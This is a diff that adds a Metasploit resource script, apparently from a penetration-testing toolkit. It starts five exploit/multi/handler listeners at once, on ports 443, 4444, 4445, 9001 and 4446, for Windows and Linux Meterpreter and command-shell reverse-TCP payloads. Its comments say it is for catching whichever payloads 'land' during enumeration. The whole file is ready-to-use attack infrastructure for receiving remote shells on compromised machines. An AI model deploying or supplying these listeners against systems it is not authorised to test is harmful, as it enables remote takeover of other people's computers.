@@ -1,0 +1,50 @@
+# Multi-Catch Handler - Spins up all common listeners at once
+# Use when: Throwing payloads during enumeration, not sure what will land
+# Requires: LHOST set globally via setup_msf_from_auto_recon.sh
+
+echo "[*] Starting multi-catch listeners on ${LHOST}..."
+
+# Windows x64 Meterpreter - port 443
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LPORT 443
+set ExitOnSession false
+run -j
+
+# Windows x86 Meterpreter - port 4444
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 4444
+set ExitOnSession false
+run -j
+
+# Windows x64 CMD shell - port 4445
+use exploit/multi/handler
+set PAYLOAD windows/x64/shell_reverse_tcp
+set LPORT 4445
+set ExitOnSession false
+run -j
+
+# Linux x64 shell - port 9001
+use exploit/multi/handler
+set PAYLOAD linux/x64/shell_reverse_tcp
+set LPORT 9001
+set ExitOnSession false
+run -j
+
+# Windows x64 Stageless - port 4446
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter_reverse_tcp
+set LPORT 4446
+set ExitOnSession false
+run -j
+
+echo ""
+echo "[+] All handlers started. Active listeners:"
+echo "    443  - windows/x64/meterpreter/reverse_tcp"
+echo "    4444 - windows/meterpreter/reverse_tcp (x86)"
+echo "    4445 - windows/x64/shell_reverse_tcp"
+echo "    9001 - linux/x64/shell_reverse_tcp"
+echo "    4446 - windows/x64/meterpreter_reverse_tcp (stageless)"
+echo ""
+echo "[*] Use 'jobs' to view, 'sessions' when shells land"
